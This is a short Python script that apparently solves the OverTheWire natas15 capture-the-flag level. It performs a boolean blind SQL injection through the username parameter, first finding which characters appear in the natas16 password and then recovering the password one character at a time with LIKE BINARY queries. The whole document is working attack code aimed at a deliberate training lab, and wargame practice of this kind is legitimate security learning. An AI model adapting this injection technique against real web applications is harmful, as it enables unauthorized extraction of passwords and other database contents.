#!/usr/bin/env python

import requests

URL = 'http://natas15.natas.labs.overthewire.org/index.php'
USERNAME = 'natas15'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxx'
KEY = ''

CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
PRESENT = ''

for i, l in enumerate(CHARS):
    ADDON = '?username=natas16" and password like "%' + l + "%"
    r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
    if 'This user exists' in r.text:
        PRESENT += l
        print("Chars available: %s" % PRESENT)

# Assume length of key the same as the other levels
for i in range(len(PASSWORD)):
    for c in PRESENT:
        ADDON = '?username=natas16" and password like BINARY "' + KEY + c + "%"
        r = requests.get(URL+ADDON, auth=(USERNAME, PASSWORD))
        if 'This user exists' in r.text:
            KEY += c
            print("Key: %s" % KEY)
